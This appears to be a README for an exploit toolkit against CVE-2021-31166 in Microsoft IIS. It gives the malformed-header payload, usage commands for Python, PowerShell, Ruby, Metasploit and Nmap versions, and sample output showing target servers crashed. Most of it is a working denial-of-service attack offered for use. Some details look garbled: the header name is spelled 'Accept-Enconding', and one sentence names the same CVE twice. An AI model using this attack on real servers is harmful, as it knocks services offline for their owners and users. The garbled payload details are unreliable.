# CVE-2021-31166

## Why

I recently wrote an exploit for CVE-2021-31166, it exploit CVE-2021-31166 and CVE-2021-31166. A pentester should use https://github.com/mauricelambert/CVE-2021-31166, but in SOC teams we need to know the specific vulneraility to fix it properly, which is why i wrote this exploit.

## Description

I propose pure python, powershell, ruby scripts and metasploit, nmap modules to attack a vulnerable IIS Web Server (perform a DOS attack to crash (blue screen) the server).

Payload is very simple:
 - `Accept-Enconding: something, ,`
 - Replace `something` with whatever header value you want
 - Should match with: `Accept-Enconding: (\w|[~/\.-]|%[0-9a-fA-F]{2})+,\s+,`

Check your payload with python:

```python
from re import fullmatch
if fullmatch(r"Accept-Enconding: (\w|[~/\.-]|%[0-9a-fA-F]{2})+,\s+,", "Accept-Enconding: something, ,"):
    print("Payload is valid !")
```

## Exploit: DOS - BlueScreen

### Python

```bash
python3 CVE202131166.py
# OR
chmod u+x CVE202131166.py
./CVE202131166.py

python3 CVE202131166.py <target>
# OR
chmod u+x CVE202131166.py
./CVE202131166.py <target>

python3 CVE202131166.py 10.10.10.10
# OR
chmod u+x CVE202131166.py
./CVE202131166.py 10.10.10.10:8000
# OR
python3 CVE202131166.py mywebservername
```

```text
~# python CVE202131166.py

CVE-2021-31166  Copyright (C) 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.

Target: 10.10.10.10

[+] http://10.10.10.10 is UP. Send payload...
[+] http://10.10.10.10 is DOWN. 10.10.10.10 is vulnerable to CVE-2021-31166.

~# 
```

### Powershell

```powershell
powershell ./CVE-2021-31166.ps1
powershell ./CVE-2021-31166.ps1 mywebservername
powershell ./CVE-2021-31166.ps1 -Target 10.10.10.10
```

```text
cmd> powershell ./CVE-2021-31166.ps1

cmdlet CVE-2021-31166.ps1 at command pipeline position 1
Supply values for the following parameters:
target: 10.10.10.10:8000

CVE-2021-31166  Copyright (C) 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.

cmd>
```

### Ruby

```bash
ruby CVE-2021-31166.rb
ruby CVE-2021-31166.rb 10.10.10.10
```

```text
~# ruby CVE-2021-31166.rb

CVE-2021-31166  Copyright (C) 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.

Host (target): 10.10.10.10
[+] Target: 10.10.10.10 is vulnerable and down.

~#
```

### Metasploit

#### Python module

```text
msf6 > use exploit/windows/iis/py_dos_iis_2021_31166
msf6 auxiliary(windows/iis/py_dos_iis_2021_31166) > set RHOST 10.10.10.10
RHOST => 10.10.10.10
msf6 auxiliary(windows/iis/py_dos_iis_2021_31166) > set RPORT 80
RPORT => 80
msf6 auxiliary(windows/iis/py_dos_iis_2021_31166) > exploit
[*] Running module against 127.0.0.1

[*] Starting server...
[*] py_dos_iis_2021_31166.py[10.10.10.10:80] - Trying first connection...
[*] py_dos_iis_2021_31166.py[10.10.10.10:80] - First connection OK. Sending payload...
[*] py_dos_iis_2021_31166.py[10.10.10.10:80] - Target is down ! Congratulations !
[*] Auxiliary module execution completed
msf6 auxiliary(windows/iis/py_dos_iis_2021_31166) >
```

#### Ruby module

```text
msf6 > use exploit/windows/iis/rb_dos_iis_2021_31166 
msf6 auxiliary(windows/iis/rb_dos_iis_2021_31166) > set RHOST 10.10.10.10
RHOST => 10.10.10.10
msf6 auxiliary(windows/iis/rb_dos_iis_2021_31166) > exploit
[*] Running module against 10.10.10.10

[+] Target is down ! Congratulations !
[*] Auxiliary module execution completed
msf6 auxiliary(windows/iis/rb_dos_iis_2021_31166) >
```

### Nmap

```bash
nmap -p 80 --script dos_iis_2021_31166 10.10.10.10
```

```text
~# nmap -p 80 --script dos_iis_2021_31166 10.10.10.10
80/tcp open  http
| dos_iis_2021_31166:
|   VULNERABLE:
|   IIS CVE-2021-31166 DOS
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2021-31166
|                   The IIS Web Server contains a RCE vulnerability. This script
|                   exploits this vulnerability with a DOS attack
|                   (causes a Blue Screen).
|
|     Disclosure date: 2021-05-11
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2021-31166
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31166
|_      https://github.com/mauricelambert/CVE-2021-31166
```

## Sources

 - [Microsoft](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-31166)
 - [nvd.nist.gov](https://nvd.nist.gov/vuln/detail/CVE-2021-31166)
 - [Pure ruby script documentation](https://mauricelambert.github.io/info/ruby/code/CVE-2021-31166/CVE202131166.html)

## Licence

Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).
